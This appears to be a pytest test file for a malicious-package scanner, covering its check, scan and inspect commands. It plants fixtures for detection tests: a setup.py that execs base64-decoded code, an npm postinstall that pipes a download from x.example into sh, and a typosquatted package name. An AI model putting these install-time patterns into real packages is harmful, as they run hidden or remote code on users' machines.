import io
import json
import tarfile

import pytest

from pkg_sentry import cli
from pkg_sentry.check import Report
from pkg_sentry.report import as_text, summary
from pkg_sentry.rules import Finding, judge
from pkg_sentry.spec import PackageSpec

EVIL_SETUP = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"


class FakeChecker:
    def __init__(self, verdicts):
        self.verdicts = verdicts
        self.seen = []

    def check(self, spec):
        self.seen.append(spec)
        return Report(spec, judge(self.verdicts.get(spec.name, [])))


@pytest.fixture
def fake(monkeypatch):
    checker = FakeChecker({
        "evil": [Finding("exec-decoded", "decodes hidden code and runs it", "setup.py", 2,
                         "exec(base64.b64decode(x))", critical=True)],
        "meh": [Finding("typosquat", "looks like 'requests'")],
    })
    monkeypatch.setattr(cli, "_checker", lambda args: checker)
    return checker


def test_check_clean_exits_0(fake, capsys):
    assert cli.main(["check", "requests", "--no-colour"]) == 0
    assert "requests (PyPI)  OK 0/100" in capsys.readouterr().out


def test_check_bad_exits_1(fake, capsys):
    assert cli.main(["check", "evil", "--no-colour"]) == 1
    out = capsys.readouterr().out
    assert "CRITICAL" in out
    assert "decodes hidden code and runs it  [setup.py:2]" in out


def test_fail_on_threshold(fake):
    assert cli.main(["check", "meh"]) == 0          # medium < high
    assert cli.main(["check", "meh", "--fail-on", "medium"]) == 1


def test_npm_flag_and_prefixes(fake):
    cli.main(["check", "--npm", "lodash@4.17.21", "pypi:requests"])
    assert fake.seen == [PackageSpec("npm", "lodash", "4.17.21"), PackageSpec("pypi", "requests")]


def test_bad_spec_exits_2(fake, capsys):
    assert cli.main(["check", "requests>=2"]) == 2
    assert "pin an exact version" in capsys.readouterr().err


def test_json_output(fake, capsys):
    cli.main(["check", "evil", "--json"])
    data = json.loads(capsys.readouterr().out)
    assert data[0]["severity"] == "critical"
    assert data[0]["findings"][0]["rule"] == "exec-decoded"
    assert data[0]["findings"][0]["line"] == 2


def test_scan_project(fake, tmp_path, capsys):
    req = tmp_path / "requirements.txt"
    req.write_text("requests==2.31.0\nevil\n-e .\n")
    assert cli.main(["scan", str(req), "--no-colour"]) == 1
    captured = capsys.readouterr()
    assert "evil (PyPI)" in captured.out
    assert "requests" not in captured.out  # clean ones are hidden unless --all
    assert "2 package(s): 1 critical, 1 ok" in captured.out
    assert "skipped option '-e'" in captured.err


def test_scan_unknown_file(fake, tmp_path):
    (tmp_path / "Gemfile").write_text("gem 'rails'")
    assert cli.main(["scan", str(tmp_path / "Gemfile")]) == 2


def test_inspect_archive(tmp_path, capsys):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        data = EVIL_SETUP.encode()
        info = tarfile.TarInfo("colourama-0.1/setup.py")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    archive = tmp_path / "colourama-0.1.tar.gz"
    archive.write_bytes(buf.getvalue())
    assert cli.main(["inspect", str(archive), "--no-colour"]) == 1
    out = capsys.readouterr().out
    assert "CRITICAL" in out
    assert "'colorama' with an extra letter" in out  # name taken from the file name


def test_inspect_folder(tmp_path, capsys):
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "package.json").write_text(json.dumps(
        {"name": "x", "scripts": {"postinstall": "curl -s https://x.example/a.sh | sh"}}))
    (tmp_path / "pkg" / "node_modules").mkdir()
    (tmp_path / "pkg" / "node_modules" / "evil.js").write_text("eval(atob('eA=='))")
    assert cli.main(["inspect", str(tmp_path / "pkg"), "--json"]) == 1
    data = json.loads(capsys.readouterr().out)
    rules = {f["rule"] for f in data[0]["findings"]}
    assert "download-exec" in rules
    assert "exec-decoded" not in rules  # node_modules isn't the package


def test_inspect_missing(tmp_path, capsys):
    assert cli.main(["inspect", str(tmp_path / "nope.tar.gz")]) == 2


def test_no_command_prints_help(capsys):
    assert cli.main([]) == 2
    assert "usage" in capsys.readouterr().out


@pytest.mark.parametrize(
    "filename, name",
    [("requests-2.31.0.tar.gz", "requests"), ("left-pad-1.3.0.tgz", "left-pad"),
     ("python_dateutil-2.9.0-py2.py3-none-any.whl", "python_dateutil"), ("pkg", "pkg")],
)
def test_guess_name(filename, name):
    assert cli._guess_name(__import__("pathlib").Path(filename)) == name


def test_text_report_trims_repeated_evidence():
    findings = [Finding("raw-ip-url", f"talks to 1.2.3.{i}", f"f{i}.py", 1) for i in range(6)]
    text = as_text(Report(PackageSpec("pypi", "x"), judge(findings)))
    assert text.count("talks to") == 3
    assert "(more like this in other files)" in text


def test_error_report():
    report = Report(PackageSpec("pypi", "x", "9"), judge([]), error="x has no release 9")
    assert as_text(report) == "x==9 (PyPI)\n  error: x has no release 9"
    assert summary([report]) == "1 package(s): 1 couldn't be checked"
